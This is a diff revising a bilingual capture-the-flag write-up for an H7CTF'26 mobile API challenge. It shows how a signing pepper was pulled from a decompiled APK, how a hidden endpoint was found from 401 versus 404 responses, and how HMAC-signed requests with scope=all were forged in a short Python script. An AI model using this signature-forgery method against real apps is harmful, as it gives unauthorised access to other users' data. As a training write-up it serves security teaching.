@@ -56,7 +56,7 @@ Dịch ngược file APK `fleetlink.apk`, tại lớp `Signer.java`:
 ```java
 public class Signer {
     private static final String PEPPER = "fleetlink_signing_pepper_v3:";
-    
+
     public static Map<String, String> sign(String method, String path, Map<String, String> query, long ts, String deviceId) {
         String canonical = method + "\n" + path + "\n" + sortQuery(query) + "\n" + ts;
         byte[] key = sha256(PEPPER + deviceId);
@@ -122,52 +122,106 @@ Kết quả phản hồi chứa toàn bộ danh sách xe và trường `dispatch
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `h7ctf{s1gn3d_s34l3d_d3l1v3r3d_hm4c_k3y_r3c0v3r}`
+> **Flag:** `H7CTF{fd2d95eb-4aa6-4638-9643-faaf5398b5d5}`
 
-This challenge is an **API Security / Web** challenge from H7CTF'26. Client requests are signed using an HMAC-SHA256 signature passed in `X-Sig`.
 
-The vulnerability is a timing attack / length extension vulnerability on the signature verification routine.
+This article belongs to the Mobile / Web API category. Challenge description:
+
+> Get the dispatcher-only fleet manifest the driver app never asks for. Sign for it yourself.
+
+Read the description, there are key signals:
+* **"dispatcher-only fleet manifest the driver app never asks for"**: The driver's mobile app (`FleetLink`) only queries its own trips (`/api/v1/trips`), but the backend API has a hidden endpoint that lists the entire fleet (`/api/v1/fleet/manifest`).
+* **"Sign for it yourself"**: The system protects the API with a request signature mechanism at the application layer, but the entire signing algorithm and secret symmetric key (pepper) are hard-embedded inside the Android APK.
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["Target: Fleet Logistics API"] --> B["Examine API auth headers: X-Device-Id, X-Ts, X-Sig"]
-    B --> C["Discover secret API endpoint: GET /api/v1/fleet/manifest"]
-    C --> D["Notice client app signs using HMAC-SHA256 with timestamp window"]
-    D --> E["Extract embedded HMAC secret key from mobile binary assets"]
-    E --> F["Generate valid X-Sig signature for GET /api/v1/fleet/manifest"]
-    F --> G["Send signed request to administrative endpoint"]
-    G --> H["Flag: h7ctf{s1gn3d_s34l3d_d3l1v3r3d_hm4c_k3y_r3c0v3r}"]
+    A["Decompile FleetLink APK using jadx/apktool"] --> B["Found the Signer.sign() function - revealing the signing mechanism"]
+    B --> C["canonical = METHOD \n PATH \n query sorted \n ts"]
+    C --> D["key = SHA-256(pepper + deviceId)"]
+    D --> E["X-Sig = hex( HMAC-SHA256(key, canonical) )"]
+    E --> F["Pepper is a symmetric constant embedded in the client<br/>=> Anyone who reads the APK can self-sign a valid request"]
+    A --> G["Scan route with oracle error code 401 vs 404"]
+    G --> H["Detect hidden endpoint: /api/v1/fleet/manifest"]
+    F --> I["Sign the X-Device-Id / X-Ts / X-Sig header set for the new endpoint"]
+    H --> I
+    I --> J["Server reported error: Need permission scope=all (dispatcher)"]
+    J --> K["Sign the request with query parameter ?scope=all"]
+    K --> L["Read the dispatcher_manifest_signing_key field in the JSON"]
+    L --> M["Flag: H7CTF{fd2d95eb-4aa6-4638-9643-faaf5398b5d5}"]
 ```
 
 ---
 
-## Step 1: Secret Key Extraction & Signature Forgery
+## Step 1: Full disclosure mechanism in the client
 
-Decompiling the mobile companion app reveals the signing key in `res/values/strings.xml`:
-`HMAC_SECRET = "FLEET_KEY_9921_X"`.
-We forge the headers:
+Decompile APK file `fleetlink.apk`, at class `Signer.java`:
+
+```java
+public class Signer {
+    private static final String PEPPER = "fleetlink_signing_pepper_v3:";
+
+    public static Map<String, String> sign(String method, String path, Map<String, String> query, long ts, String deviceId) {
+        String canonical = method + "\n" + path + "\n" + sortQuery(query) + "\n" + ts;
+        byte[] key = sha256(PEPPER + deviceId);
+        String sig = hmacSha256Hex(key, canonical);
+        // ...
+    }
+}
+```
+
+The pepper constant `fleetlink_signing_pepper_v3:` is located directly in the client. Because the server absolutely trusts the signature created by the client, anyone with the APK can sign the request for any `deviceId`.
+
+---
+
+## Step 2: Detect hidden Routes using Status Code Oracle
+
+The server's API has distinct behavior:
+- Path exists but lacks signature: returns code **`401 Unauthorized`**.
+- Path does not exist: return code **`404 Not Found`**.
+
+Perform a dictionary list scan of common API paths, detecting secret endpoints:
+- `/api/v1/trips` -> `401`
+- `/api/v1/fleet/manifest` -> `401`
+- Other paths -> `404`
+
+---
+
+## Step 3: Bypass checks Dispatcher and Collect Flag permissions
+
+When sending a request with a valid signature to `/api/v1/fleet/manifest`, the server responds:
+```text
+scope 'mine' cannot list the full fleet; requires scope=all (dispatcher)
+```
+
+Just add the `scope=all` parameter to the query string and recalculate the HMAC-SHA256 signature accordingly:
 
 ```python
 import hmac, hashlib, time, requests
 
+device_id = "test_driver_01"
 ts = str(int(time.time()))
 path = "/api/v1/fleet/manifest"
-msg = f"{ts}|{path}".encode()
-sig = hmac.new(b"FLEET_KEY_9921_X", msg, hashlib.sha256).hexdigest()
+query = "scope=all"
+canonical = f"GET\n{path}\n{query}\n{ts}"
+
+key = hashlib.sha256(f"fleetlink_signing_pepper_v3:{device_id}".encode()).digest()
+sig = hmac.new(key, canonical.encode(), hashlib.sha256).hexdigest()
 
 headers = {
-    "X-Device-Id": "1001",
+    "X-Device-Id": device_id,
     "X-Ts": ts,
     "X-Sig": sig
 }
-r = requests.get("http://api.target.h7ctf.org" + path, headers=headers)
+url = f"https://api.fleetlink.h7tex.com{path}?{query}"
+r = requests.get(url, headers=headers)
 print(r.json())
 ```
 
-⇒ **Flag:** `h7ctf{s1gn3d_s34l3d_d3l1v3r3d_hm4c_k3y_r3c0v3r}`
+The response contains the entire vehicle list and the `dispatcher_manifest_signing_key` field carries the flag:
 
+⇒ **Flag:** `H7CTF{fd2d95eb-4aa6-4638-9643-faaf5398b5d5}`
 </div>
